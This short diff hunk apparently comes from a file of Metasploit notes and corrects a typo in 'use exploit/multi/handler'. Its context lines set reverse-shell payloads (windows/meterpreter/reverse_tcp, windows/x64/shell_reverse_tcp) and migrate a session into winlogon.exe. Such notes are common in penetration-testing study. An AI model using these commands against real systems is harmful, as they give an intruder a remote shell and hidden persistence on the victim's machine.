@@ -24,7 +24,7 @@ migrate -N winlogon.exe
 run
 
 
-use exploit/mulit/handler
+use exploit/multi/handler
 
 set payload windows/meterpreter/reverse_tcp
 set PAYLOAD windows/x64/shell_reverse_tcp
